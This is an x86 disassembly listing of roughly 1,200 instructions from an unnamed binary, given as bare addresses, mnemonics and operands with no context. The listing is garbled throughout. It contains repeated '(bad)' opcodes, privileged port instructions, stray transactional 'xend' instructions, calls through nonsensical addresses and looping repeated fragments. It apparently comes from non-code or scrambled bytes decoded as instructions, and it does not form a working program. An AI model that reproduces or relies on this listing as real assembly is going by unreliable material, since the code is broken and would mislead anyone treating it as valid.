  425c93:	or     dl,BYTE PTR [ebx-0x7e]
  425c96:	push   ebx
  425c97:	jle    0x425c4b
  425c99:	pop    es
  425c9a:	or     al,0xb2
  425c9c:	mov    ah,0x29
  425c9e:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  425ca5:	dec    ebp
  425ca6:	dec    ebp
  425ca7:	xor    al,0x71
  425caa:	adc    BYTE PTR [edi+0x53f75371],0x51
  425cb1:	mov    dl,0xf8
  425cb3:	sub    DWORD PTR [edx-0x100f342],esi
  425cb9:	adc    BYTE PTR [edi-0x75587f76],0x53
  425cc0:	add    BYTE PTR [eax+0x7e538a77],0xb2
  425cc7:	pop    es
  425cc8:	or     al,0xb2
  425cca:	mov    ah,0x29
  425ccc:	call   DWORD PTR [eax+eax*4-0x3ac7559]
  425cd3:	mov    dl,0x86
  425cd5:	or     al,0xed
  425cd7:	(bad)  
  425cd8:	or     eax,0xff29b4b2
  425cdd:	je     0x425ccb
  425cdf:	test   DWORD PTR [eax+0x41501577],0x4d4dd518
  425ce9:	dec    ebp
  425cea:	xor    al,0x15
  425ced:	in     eax,dx
  425cee:	add    eax,0x29bab20d
  425cf3:	push   ebx
  425cf4:	cld    
  425cf5:	mov    dl,0x86
  425cf7:	or     al,0xff
  425cf9:	mov    dl,0x80
  425cfb:	lock mov al,BYTE PTR [eax-0x3d127569]
  425d02:	or     eax,0xf8b25153
  425d07:	sub    DWORD PTR [edx-0x100f342],esi
  425d0d:	adc    BYTE PTR [edi-0x75587f76],0x53
  425d14:	jle    0x425d03
  425d16:	(bad)  
  425d17:	or     eax,0xb20c07b2
  425d1c:	mov    ah,0x29
  425d1e:	call   DWORD PTR [esp+ebp*8-0x75687f02]
  425d25:	and    BYTE PTR [edi-0x1281ac76],0xc6
  425d2c:	or     eax,0xb229b4b2
  425d31:	pop    es
  425d32:	or     al,0xff
  425d34:	xchg   esp,eax
  425d35:	in     al,dx
  425d36:	(bad)  
  425d37:	push   eax
  425d38:	xend   
  425d3b:	dec    ebp
  425d3c:	dec    ebp
  425d3d:	dec    ebp
  425d3e:	add    DWORD PTR [edi+0x52],ecx
  425d41:	dec    ebp
  425d42:	dec    ebp
  425d43:	dec    ebp
  425d44:	or     al,BYTE PTR [eax-0xf7f7589]
  425d4a:	mov    ah,dl
  425d4c:	or     eax,0x53fc53a3
  425d51:	adc    DWORD PTR [edx-0x454df37a],esi
  425d57:	sub    edi,edi
  425d59:	mov    dl,0xa
  425d5b:	xor    BYTE PTR [edi+0x2d],0x1
  425d5f:	adc    ch,dh
  425d61:	lea    ecx,[ebp-0x327f6973]
  425d67:	cmp    cl,BYTE PTR ds:[ebp+0x4d814d8d]
  425d6e:	xchg   edi,eax
  425d6f:	and    eax,0x5055f080
  425d74:	cmp    al,BYTE PTR [eax-0xf7f7b89]
  425d7a:	stc    
  425d7b:	or     DWORD PTR [esi-0x3],eax
  425d7e:	or     al,0xb2
  425d80:	mov    esi,0x84f0800c
  425d85:	adc    BYTE PTR [edi+0x537c53f9],0x72
  425d8c:	push   edi
  425d8e:	stos   BYTE PTR es:[edi],al
  425d8f:	dec    ebp
  425d90:	xlat   BYTE PTR ds:[ebx]
  425d91:	xor    eax,0x4d29bab2
  425d96:	xlat   BYTE PTR ds:[ebx]
  425d97:	inc    ebp
  425d98:	xchg   ah,cl
  425d9a:	add    eax,0x77804d4d
  425d9f:	test   BYTE PTR [eax+0x4609f9f0],al
  425da5:	std    
  425da6:	or     al,0xb2
  425da8:	mov    esi,0x84f0800c
  425dad:	adc    BYTE PTR [edi+0x537c53f9],0x72
  425db4:	push   edi
  425db6:	stos   BYTE PTR es:[edi],al
  425db7:	dec    ebp
  425db8:	xlat   BYTE PTR ds:[ebx]
  425db9:	push   ebp
  425dba:	mov    dl,0xba
  425dbc:	sub    DWORD PTR [ebp-0x29],ecx
  425dbf:	cmp    eax,0x4d059886
  425dc4:	dec    ebp
  425dc5:	xor    BYTE PTR [edi-0x76],0x80
  425dc9:	lock mov dl,BYTE PTR [ebx+0x11]
  425dcd:	mov    dl,0xba
  425dcf:	sub    DWORD PTR [ebx-0x4],edx
  425dd2:	mov    dl,0x86
  425dd4:	or     al,0xff
  425dd6:	mov    dl,0x80
  425dd8:	lock mov al,BYTE PTR [eax+0x51538a97]
  425ddf:	mov    dl,0xbe
  425de1:	or     al,0x53
  425de3:	xchg   esp,eax
  425de4:	mov    dl,0xf8
  425de6:	sub    edi,edi
  425de8:	(bad)  
  425de9:	in     al,dx
  425dea:	mov    dl,0x80
  425dec:	lock mov al,BYTE PTR [eax+0x51538a97]
  425df3:	mov    dl,0xbe
  425df5:	or     al,0x53
  425df7:	xchg   esp,eax
  425df8:	mov    dl,0xf8
  425dfa:	sub    edi,edi
  425dfc:	(bad)  
  425dfd:	in     al,dx
  425dfe:	mov    dl,0x80
  425e00:	lock mov al,BYTE PTR [eax+0x51538a97]
  425e07:	mov    dl,0xbe
  425e09:	or     al,0x53
  425e0b:	xchg   esp,eax
  425e0c:	mov    dl,0xf8
  425e0e:	sub    edi,edi
  425e10:	(bad)  
  425e11:	in     al,dx
  425e12:	mov    dl,0x50
  425e14:	dec    edi
  425e15:	push   edx
  425e16:	dec    ebp
  425e17:	dec    ebp
  425e18:	dec    ebp
  425e19:	xor    BYTE PTR [edi+0x55],0x80
  425e1d:	lea    eax,[eax-0x687f7910]
  425e23:	xchg   BYTE PTR [ebx+0x51],dl
  425e26:	push   ebx
  425e27:	xchg   esp,eax
  425e28:	mov    dl,0xbe
  425e2a:	or     al,0xb2
  425e2c:	clc    
  425e2d:	sub    edi,edi
  425e2f:	(bad)  
  425e30:	push   eax
  425e31:	xend   
  425e34:	dec    ebp
  425e35:	dec    ebp
  425e36:	dec    ebp
  425e37:	xor    BYTE PTR [edi+0x21],0x80
  425e3b:	lea    eax,[eax-0x687f7510]
  425e41:	mov    dl,BYTE PTR [ebx+0x51]
  425e44:	mov    dl,0xbe
  425e46:	or     al,0x80
  425e48:	ins    DWORD PTR es:[edi],dx
  425e49:	or     dl,BYTE PTR [ebx-0x6c]
  425e4c:	mov    dl,0xf8
  425e4e:	sub    edi,edi
  425e50:	(bad)  
  425e51:	push   eax
  425e52:	xend   
  425e55:	dec    ebp
  425e56:	dec    ebp
  425e57:	dec    ebp
  425e58:	xor    BYTE PTR [edi+0x1d],0x80
  425e5c:	lock sbb eax,0xbab21153
  425e62:	sub    DWORD PTR [ebx-0x4],edx
  425e65:	mov    dl,0x86
  425e67:	or     al,0xff
  425e69:	mov    dl,0x80
  425e6b:	lock mov al,BYTE PTR [eax-0x6bac7569]
  425e72:	push   ebx
  425e73:	push   ecx
  425e74:	mov    dl,0xf8
  425e76:	sub    DWORD PTR [edx-0x100f342],esi
  425e7c:	adc    BYTE PTR [edi-0x75587f76],0x53
  425e83:	jle    0x425e37
  425e85:	pop    es
  425e86:	or     al,0xed
  425e88:	(bad)  
  425e89:	or     eax,0xff29b4b2
  425e8e:	xchg   esp,eax
  425e8f:	in     al,dx
  425e90:	(bad)  
  425e91:	push   eax
  425e92:	xend   
  425e95:	dec    ebp
  425e96:	dec    ebp
  425e97:	dec    ebp
  425e98:	xor    BYTE PTR [edi-0x76],0x80
  425e9c:	lock mov ch,ch
  425e9f:	add    eax,0x29bab20d
  425ea4:	push   ebx
  425ea5:	cld    
  425ea6:	mov    dl,0x86
  425ea8:	or     al,0xff
  425eaa:	mov    dl,0x80
  425eac:	lock mov al,BYTE PTR [eax-0x3d127569]
  425eb3:	or     eax,0xf8b25153
  425eb8:	sub    DWORD PTR [edx-0x100f342],esi
  425ebe:	in     al,dx
  425ebf:	mov    dl,0x80
  425ec1:	lock mov al,BYTE PTR [eax-0x3d127569]
  425ec8:	or     eax,0xf8b25153
  425ecd:	sub    DWORD PTR [edx-0x100f342],esi
  425ed3:	add    DWORD PTR [eax],ebx
  425ed5:	push   edx
  425ed6:	dec    ebp
  425ed7:	dec    ebp
  425ed8:	dec    ebp
  425ed9:	stos   BYTE PTR es:[edi],al
  425eda:	adc    BYTE PTR [edi-0x75587f76],0xec
  425ee1:	mov    dl,0x53
  425ee3:	jle    0x425ee6
  425ee5:	lock adc DWORD PTR [eax+0x41],0x4f
  425eea:	aad    0x4d
  425eec:	dec    ebp
  425eed:	dec    ebp
  425eee:	xor    BYTE PTR [edi+0x2d],0xed
  425ef2:	(bad)  
  425ef3:	or     eax,0xb20c07b2
  425ef8:	mov    ah,0x29
  425efa:	call   DWORD PTR [ecx+eax*1-0x727277f0]
  425f01:	lea    eax,[eax-0x72c5c133]
  425f07:	lea    ebp,[edx+0x4d814d96]
  425f0d:	xchg   edi,eax
  425f0e:	and    eax,0xbdd56a4f
  425f13:	xor    BYTE PTR [edi-0x79],0x80
  425f17:	lock xor cl,BYTE PTR [ecx]
  425f1a:	inc    esi
  425f1b:	std    
  425f1c:	or     al,0xb2
  425f1e:	mov    esi,0x80b6800c
  425f23:	std    
  425f24:	xor    BYTE PTR [edi-0x79],0x80
  425f28:	xchg   edi,eax
  425f29:	xor    dl,BYTE PTR [ebx+0x72]
  425f2c:	push   ebx
  425f2d:	sub    dh,BYTE PTR [edx+0x77802984]
  425f33:	and    edi,edi
  425f35:	inc    BYTE PTR [eax+0xada6371]
  425f3b:	adc    BYTE PTR [edi-0x7faa3bab],0xc
  425f42:	and    BYTE PTR [edi-0xda707f],0x10
  425f49:	and    eax,0xc87780ef
  425f4e:	xor    al,0x8b
  425f51:	or     DWORD PTR [esi-0x3],eax
  425f54:	or     al,0xb2
  425f56:	mov    esi,0xc8f0800c
  425f5b:	and    BYTE PTR [edi+0x537c538b],0xa4
  425f62:	mov    dl,0xba
  425f64:	sub    DWORD PTR [eax+0x74ff71f0],eax
  425f6a:	in     al,dx
  425f6b:	std    
  425f6c:	xor    BYTE PTR [edi+0x21],0x80
  425f70:	sbb    eax,0x500a0063
  425f75:	lock jno 0x425f5c
  425f78:	jl     0x425f3e
  425f7a:	outs   dx,DWORD PTR ds:[esi]
  425f7b:	adc    BYTE PTR [edi+0x21778055],0x80
  425f82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f83:	xor    BYTE PTR [eax+0x50659fec],0x1d
  425f8a:	sbb    BYTE PTR ds:0x80eca680,0x2e
  425f91:	lea    ecx,[ebp+0x71f0508d]
  425f97:	and    BYTE PTR [esi+0x4381a780],0x11
  425f9e:	and    BYTE PTR [edi-0x7f00af11],0x8d
  425fa5:	and    BYTE PTR [esi-0x7fc28214],0x77
  425fac:	xchg   DWORD PTR [eax-0x10],edx
  425faf:	scas   eax,DWORD PTR es:[edi]
  425fb0:	xor    al,0x32
  425fb3:	or     DWORD PTR [esi-0x3],eax
  425fb6:	or     al,0xb2
  425fb8:	mov    esi,0x87f0800c
  425fbd:	and    BYTE PTR [edi+0x537c5332],0xa4
  425fc4:	mov    dl,0xba
  425fc6:	sub    edi,edi
  425fc8:	je     0x42601a
  425fca:	ja     0x426011
  425fcc:	xor    BYTE PTR [edi+0x71],0xbe
  425fd0:	lds    edi,FWORD PTR [edx]
  425fd2:	lea    ecx,[ebp-0x7f788880]
  425fd8:	lock xor cl,BYTE PTR [ecx]
  425fdb:	inc    esi
  425fdc:	std    
  425fdd:	or     al,0xb2
  425fdf:	mov    esi,0x87f0800c
  425fe4:	and    BYTE PTR [edi+0x29bab232],0x80
  425feb:	lock adc eax,0xa4537c53
  425ff1:	in     eax,dx
  425ff2:	mov    dl,0x8b
  425ff4:	push   DWORD PTR [esi+esi*4-0x42]
  425ff8:	arpl   WORD PTR [edx-0x72f412f7],si
  425ffe:	lea    ecx,[ebp+0x171a780]
  426004:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426005:	jae    0x425ff6
  426007:	inc    ebx
  426008:	std    
  426009:	push   eax
  42600a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42600b:	xor    eax,0x803df050
  426010:	lock test DWORD PTR [eax+0x46097a77],0x86b20cb2
  42601b:	or     al,0x80
  42601d:	ja     0x426016
  42601f:	and    BYTE PTR [edi+0x2984b27a],0x80
  426026:	ja     0x425ff0
  426028:	push   ebx
  426029:	sub    dl,BYTE PTR [ebx-0x5c]
  42602c:	call   DWORD PTR [ecx]
  42602e:	and    BYTE PTR [edi-0x7db9f675],0xc
  426035:	push   eax
  426036:	ja     0x42608d
  426038:	xor    BYTE PTR [edi-0x38],0x6e
  42603c:	out    0x55,eax
  42603e:	in     eax,dx
  42603f:	mov    dl,0xa6
  426041:	mov    dl,0xc4
  426043:	or     al,0x80
  426045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426046:	mov    edx,DWORD PTR [ebx-0x5c]
  426049:	xor    BYTE PTR [edi+0x55b79455],ah
  42604f:	and    BYTE PTR [edi-0x740f7f38],0x9
  426056:	inc    esi
  426057:	adc    DWORD PTR [edx+esi*4],ecx
  42605a:	test   BYTE PTR [ecx],ch
  42605c:	xor    BYTE PTR [edi-0x38],0xb2
  426060:	mov    esi,0x8bf0800c
  426065:	push   ebx
  426066:	jo     0x42601a
  426068:	test   BYTE PTR [ecx],ch
  42606a:	xor    BYTE PTR [edi+0x55],0x53
  42606e:	lods   al,BYTE PTR ds:[esi]
  42606f:	jmp    DWORD PTR [eax+0x935f080]
  426075:	pop    esp
  426076:	xor    BYTE PTR [ebx+0x74],al
  426079:	xor    esi,DWORD PTR [edx+0x50f7f080]
  42607f:	ja     0x4260d6
  426081:	xor    BYTE PTR [edi+0x7a],0x9
  426085:	inc    esi
  426086:	mov    dl,0xc
  426088:	mov    dl,0x86
  42608a:	or     al,0x80
  42608c:	ja     0x426085
  42608e:	and    BYTE PTR [edi+0x2984b27a],0x80
  426095:	ja     0x4260cc
  426097:	or     DWORD PTR [ebp+ecx*4-0x33],ebx
  42609b:	add    eax,0xa6a453a7
  4260a0:	adc    ebp,ecx
  4260a2:	mov    dl,0xa6
  4260a4:	xchg   esp,eax
  4260a5:	xchg   BYTE PTR [ebx+0x70],dl
  4260a8:	xchg   BYTE PTR fs:[edi+0x36092643],cl
  4260af:	mov    dl,0xc
  4260b1:	mov    dl,0x84
  4260b3:	or     al,0x57
  4260b5:	fstp   DWORD PTR [eax-0x21]
  4260b8:	adc    DWORD PTR [ebx+0x11],edx
  4260bb:	addr16 out 0x58,al
  4260be:	fist   WORD PTR [ecx]
  4260c0:	xlat   BYTE PTR ds:[ebx]
  4260c1:	aaa    
  4260c2:	arpl   WORD PTR [ecx],dx
  4260c4:	xlat   BYTE PTR ds:[ebx]
  4260c5:	dec    esi
  4260c6:	or     BYTE PTR [eax+eax*4],0xf0
  4260ca:	jno    0x4260b8
  4260cc:	cmp    al,BYTE PTR [eax+0x65ed55f0]
  4260d2:	out    dx,eax
  4260d3:	(bad)  
  4260d4:	aad    0xe
  4260d6:	or     BYTE PTR [eax+eax*4],0xf0
  4260da:	jno    0x4260c8
  4260dc:	cmp    al,BYTE PTR [eax+0x77eceff0]
  4260e2:	push   ebp
  4260e3:	xor    BYTE PTR [eax],0x3a
  4260e6:	out    dx,eax
  4260e7:	in     eax,dx
  4260e8:	ja     0x42611f
  4260ea:	or     al,0x4d
  4260ec:	lock cmp eax,0x4d234f09
  4260f2:	dec    ebp
  4260f3:	dec    ebp
  4260f4:	les    ebp,FWORD PTR [edi]
  4260f6:	xchg   BYTE PTR fs:[edi+0x77802643],cl
  4260fd:	adc    eax,0x7c45773a
  426102:	ja     0x42616e
  426104:	rcr    BYTE PTR [eax-0x21],1
  426107:	adc    DWORD PTR [eax-0x59],edx
  42610a:	jbe    0x42608c
  42610c:	ja     0x426178
  42610e:	xor    al,0x76
  426111:	or     DWORD PTR [esi-0x3],eax
  426114:	or     al,0xb2
  426116:	mov    esi,0x6af0800c
  42611b:	and    BYTE PTR [edi+0x29bab276],0x80
  426122:	lock and DWORD PTR [eax+0x537c5330],eax
  426129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42612a:	push   DWORD PTR [ecx+eax*1+0x75]
  42612e:	mov    dl,0xe5
  426130:	xor    al,0x45
  426133:	arpl   di,bp
  426135:	rcl    DWORD PTR [ebp-0x80],cl
  426138:	ja     0x4261ab
  42613a:	in     al,dx
  42613b:	ja     0x426152
  42613d:	push   eax
  42613e:	ja     0x4261b1
  426140:	sub    BYTE PTR [ebp-0x12],0x50
  426144:	ja     0x42615b
  426146:	xor    BYTE PTR [edi-0x79],0x80
  42614a:	lock xor cl,BYTE PTR [ecx]
  42614d:	inc    esi
  42614e:	std    
  42614f:	or     al,0xb2
  426151:	mov    esi,0x87f0800c
  426156:	and    BYTE PTR [edi+0x53a45332],0x7c
  42615d:	push   DWORD PTR [edx+esi*4-0x46]
  426161:	sub    DWORD PTR [edi+0x77],ebx
  426164:	adc    eax,0xdbf4f09
  426169:	dec    ebp
  42616a:	dec    ebp
  42616b:	xor    al,0x8a
  42616e:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  426175:	or     al,0xe2
  426177:	or     eax,0xb2f7539d
  42617c:	clc    
  42617d:	sub    edi,edi
  42617f:	inc    BYTE PTR [eax-0x587f7569]
  426185:	mov    dl,BYTE PTR [ebx+0x7e]
  426188:	mov    dl,0x7
  42618a:	or     al,0x53
  42618c:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  426193:	inc    BYTE PTR [eax-0x587f7569]
  426199:	mov    dl,BYTE PTR [ebx+0x7e]
  42619c:	mov    dl,0x7
  42619e:	or     al,0x53
  4261a0:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  4261a7:	inc    BYTE PTR [eax-0x587f7569]
  4261ad:	mov    dl,BYTE PTR [ebx+0x7e]
  4261b0:	push   ebx
  4261b1:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  4261b8:	call   DWORD PTR [esp+ebp*8+0x520150fe]
  4261bf:	dec    ebp
  4261c0:	dec    ebp
  4261c1:	dec    ebp
  4261c2:	xor    al,0x81
  4261c5:	adc    BYTE PTR [edi-0x79587f7a],0x53
  4261cc:	jle    0x426221
  4261ce:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  4261d5:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  4261dc:	dec    ebp
  4261dd:	dec    ebp
  4261de:	xor    al,0x21
  4261e1:	xor    BYTE PTR [eax],0x80
  4261e4:	xchg   edi,eax
  4261e5:	mov    al,BYTE PTR [eax+0x7f808aa7]
  4261eb:	or     dl,BYTE PTR [ebx+0x7e]
  4261ee:	push   ebx
  4261ef:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  4261f6:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  4261fd:	dec    ebp
  4261fe:	dec    ebp
  4261ff:	xor    al,0x1d
  426202:	adc    BYTE PTR [edi-0x4d08ace3],0xf8
  426209:	sub    DWORD PTR [ebx+0x51],edx
  42620c:	mov    dl,0xbe
  42620e:	or     al,0xff
  426210:	inc    BYTE PTR [eax-0x587f7569]
  426216:	mov    dl,BYTE PTR [ebx-0x7e]
  426219:	xor    BYTE PTR [edi-0x76],0x53
  42621d:	jle    0x4261d1
  42621f:	mov    ah,0x29
  426221:	mov    dl,0x7
  426223:	or     al,0xff
  426225:	xchg   esp,eax
  426226:	and    BYTE PTR [edi-0x1203ac76],0xc6
  42622d:	or     eax,0xb20c86b2
  426232:	mov    ah,0x29
  426234:	push   DWORD PTR [esp+ebp*8-0x9]
  426238:	push   eax
  426239:	inc    ecx
  42623a:	sbb    ch,dl
  42623c:	dec    ebp
  42623d:	dec    ebp
  42623e:	dec    ebp
  42623f:	xor    al,0x8a
  426242:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  426249:	or     al,0xe2
  42624b:	or     eax,0xb2f7539d
  426250:	clc    
  426251:	sub    edi,edi
  426253:	inc    BYTE PTR [eax-0x587f7569]
  426259:	mov    dl,BYTE PTR [ebx+0x7e]
  42625c:	mov    dl,0x7
  42625e:	or     al,0x53
  426260:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  426267:	inc    BYTE PTR [eax-0x587f7569]
  42626d:	mov    dl,BYTE PTR [ebx+0x7e]
  426270:	mov    dl,0x7
  426272:	or     al,0x53
  426274:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  42627b:	inc    BYTE PTR [ecx]
  42627d:	xchg   edi,eax
  42627e:	adc    DWORD PTR [eax+0x16],0x1
  426282:	aad    0x4d
  426284:	dec    ebp
  426285:	dec    ebp
  426286:	add    DWORD PTR [ecx],eax
  426288:	push   edx
  426289:	dec    ebp
  42628a:	dec    ebp
  42628b:	dec    ebp
  42628c:	xchg   esi,eax
  42628d:	xor    al,0x8a
  426290:	adc    BYTE PTR [edi-0x7faeac76],0xd7
  426297:	sub    eax,0xbeb2f753
  42629c:	or     al,0xb2
  42629e:	clc    
  42629f:	sub    edi,edi
  4262a1:	(bad)  
  4262a2:	xchg   esi,eax
  4262a3:	add    DWORD PTR [eax+ecx*4-0x73],ecx
  4262a7:	lea    ecx,[ebp+0x3e4c800a]
  4262ad:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4262b3:	xchg   edi,eax
  4262b4:	and    eax,0x3acd4c80
  4262b9:	lea    ecx,[ebp-0x7fde88b0]
  4262bf:	ja     0x4262b0
  4262c1:	sub    bh,0xec
  4262c4:	lock and DWORD PTR [eax-0x10],edx
  4262c8:	and    DWORD PTR [eax-0x687f3710],eax
  4262ce:	mov    ecx,DWORD PTR [ecx]
  4262d0:	inc    esi
  4262d1:	mov    dh,0xc
  4262d3:	mov    dl,0x7
  4262d5:	or     al,0x80
  4262d7:	xchg   edi,eax
  4262d8:	enter  0xd780,0x8b
  4262dc:	push   ebx
  4262dd:	or     esi,DWORD PTR [edx-0x687fd608]
  4262e3:	enter  0x2a53,0xff
  4262e7:	push   ecx
  4262e8:	adc    bh,0x8b
  4262eb:	or     DWORD PTR [esi-0x3e],eax
  4262ee:	or     al,0xb2
  4262f0:	mov    BYTE PTR [eax+eax*4],cl
  4262f3:	xlat   BYTE PTR ds:[ebx]
  4262f4:	enter  0xa780,0x8b
  4262f8:	push   ebx
  4262f9:	pushf  
  4262fa:	push   ebx
  4262fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262fc:	call   DWORD PTR [esp+ebp*8-0x37687f02]
  426303:	mov    dl,0x2
  426305:	sub    DWORD PTR [eax+0x46098bd7],eax
  42630b:	ret    0xb20c
  42630e:	mov    BYTE PTR [eax+eax*4],cl
  426311:	xlat   BYTE PTR ds:[ebx]
  426312:	enter  0xa780,0x8b
  426316:	push   ebx
  426317:	pushf  
  426318:	push   ebx
  426319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42631a:	call   DWORD PTR [esp+ebp*8-0x37687f02]
  426321:	mov    dl,0x2
  426323:	sub    DWORD PTR [eax+0x46098bd7],eax
  426329:	ret    0xb20c
  42632c:	mov    BYTE PTR [eax+eax*4],cl
  42632f:	xlat   BYTE PTR ds:[ebx]
  426330:	enter  0x9c53,0x80
  426334:	out    0x8b,eax
  426336:	push   ebx
  426337:	dec    ebp
  426338:	call   FWORD PTR [esp+ebp*8+0x4d0a96fe]
  42633f:	xlat   BYTE PTR ds:[ebx]
  426340:	and    DWORD PTR [edx-0x6979d6fe],esi
  426346:	xchg   DWORD PTR [ebp+0x4d],ecx
  426349:	xor    BYTE PTR [edi-0x51],0xab
  42634d:	test   eax,0x81fb70a3
  426352:	lea    edx,[edi-0x78127880]
  426358:	inc    ebp
  426359:	xchg   ebx,eax
  42635a:	cdq    
  42635b:	fwait
  42635c:	push   ebx
  42635d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42635e:	push   ebx
  42635f:	jo     0x4263dd
  426361:	ja     0x4262e5
  426363:	fstp   DWORD PTR [eax-0x21]
  426366:	adc    DWORD PTR [esi-0x7a],ebx
  426369:	pop    DWORD PTR [ebx+0x26]
  42636c:	push   eax
  42636d:	ja     0x4262f2
  42636f:	jl     0x4263e8
  426371:	xchg   ah,ah
  426373:	pop    eax
  426374:	fist   WORD PTR [ecx]
  426376:	push   eax
  426377:	ja     0x426300
  426379:	jl     0x4263f2
  42637b:	xchg   esi,esi
  42637d:	mov    ds:0x777c386f,eax
  426382:	enter  0xe9f6,0x6f
  426386:	cmp    BYTE PTR [edi+esi*2+0x32],bh
  42638a:	cli    
  42638b:	and    al,0x6f
  42638d:	cmp    BYTE PTR [edi+esi*2+0x32],bh
  426391:	hlt    
  426392:	and    al,0x6f
  426394:	cmp    BYTE PTR [edi+esi*2-0x75],bh
  426398:	mul    BYTE PTR [esi+ebp*8]
  42639b:	cmp    BYTE PTR [ecx],al
  42639d:	ja     0x42638d
  42639f:	push   eax
  4263a0:	ja     0x42632d
  4263a2:	xor    BYTE PTR [edi+0x1d],0x80
  4263a6:	bound  esi,QWORD PTR [esi]
  4263a8:	cmp    cl,BYTE PTR [ebp+0x1d77808d]
  4263ae:	xor    al,0x1d
  4263b1:	or     ch,0x2e
  4263b4:	cmp    cl,BYTE PTR [ebp-0x7f8e7f73]
  4263ba:	pop    ebp
  4263bb:	in     al,dx
  4263bc:	out    0x65,al
  4263be:	adc    BYTE PTR [edi+0x26508082],0x3a
  4263c5:	lea    ecx,[ebp-0x7f0618b0]
  4263cb:	out    0x83,eax
  4263cd:	or     DWORD PTR [esi-0x7b],eax
  4263d0:	or     al,0xb2
  4263d2:	popa   
  4263d3:	or     al,0x80
  4263d5:	out    0x82,eax
  4263d7:	and    BYTE PTR [edi-0x583d5d7d],0xc7
  4263de:	add    al,0xd4
  4263e0:	push   ebx
  4263e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263e2:	mov    dl,0xbc
  4263e4:	sub    DWORD PTR [eax+0x6394ff5f],eax
  4263ea:	pushf  
  4263eb:	xlat   BYTE PTR ds:[ebx]
  4263ec:	push   edx
  4263ed:	sbb    BYTE PTR [ecx],0x50
  4263f0:	xchg   edi,eax
  4263f1:	mov    eax,DWORD PTR [eax-0x687fea69]
  4263f7:	jno    0x426379
  4263f9:	xchg   edi,eax
  4263fa:	and    DWORD PTR [ecx],eax
  4263fc:	xchg   edi,eax
  4263fd:	test   BYTE PTR [edx-0x697428b3],ch
  426403:	or     bl,BYTE PTR [ecx+0x11dd74d]
  426409:	ja     0x426404
  42640b:	dec    ebp
  42640c:	xlat   BYTE PTR ds:[ebx]
  42640d:	out    dx,eax
  42640e:	dec    ebp
  42640f:	xlat   BYTE PTR ds:[ebx]
  426410:	enter  0xd74d,0x32
  426414:	dec    ebp
  426415:	xlat   BYTE PTR ds:[ebx]
  426416:	xchg   DWORD PTR [edx],ecx
  426418:	add    DWORD PTR [edi-0x76],esi
  42641b:	or     al,BYTE PTR [esi+0x4d4d4bab]
  426421:	push   eax
  426422:	ja     0x426441
  426424:	xor    BYTE PTR [edi+0x1d],0x80
  426428:	lock and eax,0x80159250
  42642e:	ja     0x426455
  426430:	jl     0x4263bf
  426432:	in     al,dx
  426433:	lea    ecx,[ebp-0x7b887f73]
  426439:	xor    al,0x25
  42643c:	push   eax
  42643d:	xchg   edx,eax
  42643e:	out    dx,al
  42643f:	xor    BYTE PTR [edi+0x71],0x80
  426443:	lock and eax,0x80ef9250
  426449:	ja     0x426460
  42644b:	xor    al,0x25
  42644e:	push   eax
  42644f:	xchg   edx,eax
  426450:	and    DWORD PTR [eax+0x6d7c2577],eax
  426456:	and    eax,0x8d8d8d3a
  42645b:	les    ebx,FWORD PTR [edi]
  42645d:	xor    BYTE PTR [edi+0x1d],0x80
  426461:	lock sbb eax,0x3a2ecd80
  426467:	lea    ecx,[ebp+0x3a265080]
  42646d:	lea    ecx,[ebp+0x3a438d80]
  426473:	push   eax
  426474:	ja     0x426400
  426476:	xor    BYTE PTR [edi-0x76],0xab
  42647a:	test   eax,0x1dfb70a3
  42647f:	lea    edx,[edi+0x77808780]
  426485:	and    DWORD PTR [edx-0x72c5c179],esp
  42648b:	lea    edx,[ebx-0x9986467]
  426491:	and    al,0x6f
  426493:	cmp    BYTE PTR [ecx],cl
  426495:	dec    edi
  426496:	mov    esi,0x808d8da6
  42649b:	ja     0x42650e
  42649d:	addr16 cmc 
  42649f:	and    al,0x6f
  4264a1:	cmp    BYTE PTR [ecx],cl
  4264a3:	dec    edi
  4264a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264a6:	lea    ecx,[ebp-0x26788884]
  4264ac:	pop    eax
  4264ad:	fist   WORD PTR [ecx]
  4264af:	pop    esi
  4264b0:	xchg   BYTE PTR [edi+0x77502643],cl
  4264b6:	xor    bh,BYTE PTR [edi+esi*2-0x7]
  4264ba:	in     al,0x58
  4264bc:	fist   WORD PTR [ecx]
  4264be:	push   eax
  4264bf:	ja     0x426447
  4264c1:	xor    BYTE PTR [edi-0x11],0x50
  4264c5:	ja     0x42648f
  4264c7:	xor    BYTE PTR [edi-0x38],0x80
  4264cb:	int    0x86
  4264cd:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  4264d3:	lea    edx,[eax+0x77]
  4264d6:	mov    esp,DWORD PTR [eax+0x7f]
  4264d9:	cmp    BYTE PTR [ebp+0x38975e8d],cl
  4264df:	lea    ecx,[ebp+0x5a7750b9]
  4264e5:	in     eax,dx
  4264e6:	push   0xd
  4264e8:	mov    ecx,0x80d17750
  4264ed:	mov    dl,0xb9
  4264ef:	push   eax
  4264f0:	ja     0x426508
  4264f2:	pop    esi
  4264f3:	int3   
  4264f4:	cmp    BYTE PTR [ebp-0x46087f73],cl
  4264fa:	push   eax
  4264fb:	xchg   edi,eax
  4264fc:	loope  0x4264ff
  4264fe:	push   edx
  4264ff:	or     al,0x1
  426501:	lahf   
